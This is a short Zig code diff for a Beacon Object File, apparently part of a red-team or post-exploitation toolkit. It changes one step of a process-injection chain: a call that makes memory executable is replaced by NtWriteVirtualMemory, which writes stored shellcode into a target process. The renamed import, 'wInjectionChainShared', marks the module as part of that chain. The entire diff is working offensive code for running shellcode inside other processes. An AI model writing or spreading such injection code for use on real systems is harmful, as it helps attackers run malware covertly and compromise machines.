@@ -1,7 +1,7 @@
 const std = @import("std");
 const beacon = @import("bof_api").beacon;
 const w32 = @import("bof_api").win32;
-const shared = @import("wSimpleChainShared.zig");
+const shared = @import("wInjectionChainShared.zig");
 
 pub export fn go(args: ?[*]u8, args_len: i32) callconv(.C) u8 {
     var parser = beacon.datap{};
@@ -12,15 +12,14 @@ pub export fn go(args: ?[*]u8, args_len: i32) callconv(.C) u8 {
         break :blk @ptrFromInt(std.mem.readInt(usize, mem, .little));
     };
 
-    const base_address: *?w32.PVOID = @ptrCast(&state.base_address);
-    var bytes_to_protect: w32.SIZE_T = state.shellcode.len;
-    var old_protection: w32.ULONG = 0;
-    state.nt_status = w32.NtProtectVirtualMemory(
+    const base_address: w32.PVOID = @ptrFromInt(state.base_address);
+    var bytes_written: w32.SIZE_T = 0;
+    state.nt_status = w32.NtWriteVirtualMemory(
         state.process_handle,
         base_address,
-        &bytes_to_protect,
-        w32.PAGE_EXECUTE_READ,
-        &old_protection,
+        state.shellcode.ptr,
+        state.shellcode.len,
+        &bytes_written,
     );
 
     return 0;
